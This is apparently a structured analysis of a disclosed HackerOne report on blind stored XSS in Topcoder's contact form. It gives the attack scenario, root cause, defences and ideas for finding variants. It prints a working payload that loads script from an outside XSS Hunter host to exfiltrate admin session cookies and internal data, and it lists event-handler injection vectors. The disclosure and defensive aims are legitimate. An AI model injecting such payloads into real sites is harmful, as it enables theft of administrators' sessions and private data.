# Blind Stored XSS in Contact Form Leading to Session Token and PII Leakage

## Metadata
- **Source:** HackerOne
- **Report:** 878145 | https://hackerone.com/reports/878145
- **Submitted:** 2020-05-19
- **Reporter:** mase289
- **Program:** Topcoder
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A blind stored XSS vulnerability exists in the Topcoder contact form at /contact-us/ due to insufficient input sanitization. Attackers can inject arbitrary JavaScript payloads through form fields (First name, Last name, Company, Description) that execute when administrators access the form data in the backend, enabling theft of session tokens, IP addresses, and internal service information.

## Attack scenario
1. Attacker navigates to https://www.topcoder.com/contact-us/
2. Attacker fills contact form fields with XSS payload: "><script src=https://xvt.xss.ht></script>
3. Attacker submits the form, payload is stored unsanitized in backend database
4. Administrator accesses contact form submissions in admin panel
5. Stored XSS payload executes in admin's browser context, triggering XSS Hunter notification
6. Attacker receives exfiltrated data including admin session cookies, IP address, and internal service details (Mailchimp info)

## Root cause
Contact form input fields lack proper sanitization and output encoding. User-supplied data is stored directly in database and rendered without HTML escaping in the admin panel interface, allowing arbitrary script execution in administrative context.

## Attacker mindset
An attacker targeting administrative access would recognize that contact forms often reach backend systems with elevated privileges. By injecting blind XSS payloads through customer-facing forms, they can exploit the trust admins place in form data, gaining visibility into internal systems and stealing authentication tokens for lateral movement.

## Defensive takeaways
- Implement strict input validation with whitelist-based filtering for all user-supplied data
- Apply HTML entity encoding to all output rendered in admin panels, especially user-submitted content
- Use Content Security Policy (CSP) headers to prevent inline script execution and restrict script sources
- Sanitize user input server-side using established libraries (e.g., DOMPurify, bleach)
- Store session tokens with HttpOnly and Secure flags to prevent XSS token theft
- Implement output encoding at render time, not just storage time
- Regular security testing including XSS payload injection testing for all forms
- Monitor and log admin panel access and data retrieval for anomalies

## Variant hunting
Search other Topcoder forms for similar sanitization issues (feedback, support, registration)
Test other input fields beyond contact form (profile updates, account settings)
Attempt DOM-based XSS in admin panel if form data processed client-side
Check for reflected XSS in admin panel query parameters or search functions
Test attribute-based injection: onfocus=, onerror=, onload= payloads
Verify if other admin backend services consume the same unsanitized data

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1566 - Phishing (social engineering to trigger admin access)
- T1059 - Command and Scripting Interpreter
- T1056 - Input Capture (stealing session tokens)
- T1539 - Steal Web Session Cookie
- T1005 - Data from Local System

## Notes
This is a blind XSS vulnerability, meaning the attacker doesn't see immediate execution feedback but relies on out-of-band channels (XSS Hunter) for confirmation. The impact is elevated because it affects administrative accounts with potentially broader system access. The disclosure reveals internal infrastructure details (Mailchimp integration, backend services) which could enable further reconnaissance attacks.

## Full report
<details><summary>Expand</summary>

## Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.  I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1.	Browse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field. 
2.	Submit the form and have and admin access the information.
3.	This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event. 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

F834746  XSS hunter screenshot revealing mail chimp information

█████ Dom.html you can search through this for my XSS hunter payload `"><script src=https://xvt.xss.ht></script>`

F834748 Full XSS hunter email report

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

</details>

---
*Analysed by Claude on 2026-05-12*
